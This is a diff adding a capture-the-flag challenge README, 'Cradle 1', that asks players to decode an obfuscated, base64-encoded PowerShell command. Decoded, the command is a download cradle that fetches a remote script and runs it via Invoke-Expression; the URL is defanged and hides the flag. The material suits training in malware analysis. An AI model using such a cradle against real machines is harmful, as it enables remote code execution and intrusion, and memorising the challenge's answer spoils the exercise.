@@ -1,0 +1,13 @@
+# Cradle 1
+
+## Description
+
+McSkiddy considers himself a connoisseur of all things PowerShell for initial access. He even found a nifty tool that automagically obfuscates scripts! Surely with this, the secrets of his tradecraft will be known to him alone...right?
+
+Can you prove him wrong by uncovering what this script of his does?
+
+```ps1
+powershell -nop -enc "LgAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBpACcALAAnAGUAeAAnACkAIAAoACgALgAoACIAewAwAH0AewAxAH0AewAyAH0AIgAgAC0AZgAnAE4AZQB3AC0AJwAsACcATwBiAGoAZQAnACwAJwBjAHQAJwApACAAUwB5AHMAdABgAGUAbQBbAC4AXQBuAGAARQBgAFQAWwAuAF0AdwBFAEIAYwBsAGkAYABlAG4AdAApAC4AIgBEAG8AVwBOAEwAYABvAEEARABzAGAAVABgAFIAaQBgAE4AZwAiACgAJwBoAHgAeABwAHMAWwA6AC8ALwBdAHQAcgBhAG4AcwBmAGUAcgBbAC4AXQBzAGgALwAoACgAKAAiAHsANAB9AHsAMQB9AHsAMAB9AHsANwB9AHsANgB9AHsAMgB9AHsAMwB9AHsANQB9ACIALQBmACAAJwAnAHMAZQBjACcAJwAsACcAJwB7AG4AbwB0AF8AcwBvAF8AJwAnACwAJwAnAGUAJwAnACwAJwAnAGMAcgBhAGYAdAAnACcALAAnACcAbABlAHYAZQBsAGUAZgBmAGUAYwB0ACcAJwAsACcAJwB9ACcAJwAsACcAJwB0AHIAYQBkACcAJwAsACcAJwByAGUAdABfACcAJwApACkAKQAvAGEAWwAuAF0AcABzADEAJwApACkA"
+
+```
+
